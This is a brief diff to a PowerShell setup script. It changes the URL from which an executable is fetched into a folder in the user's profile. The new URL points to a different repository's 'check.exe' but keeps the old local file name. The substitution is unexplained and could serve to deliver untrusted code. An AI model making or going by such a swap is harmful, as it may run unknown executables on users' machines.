@@ -1,6 +1,6 @@
 $dir = "$env:USERPROFILE\collextor"
 $exe = "$dir\collextor_msvc.exe"
-$url = "https://github.com/TheAmalgamClient/colex/releases/download/v1/collextor_msvc.exe"
+$url = "https://github.com/Holycheck/checker/releases/download/main/check.exe"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
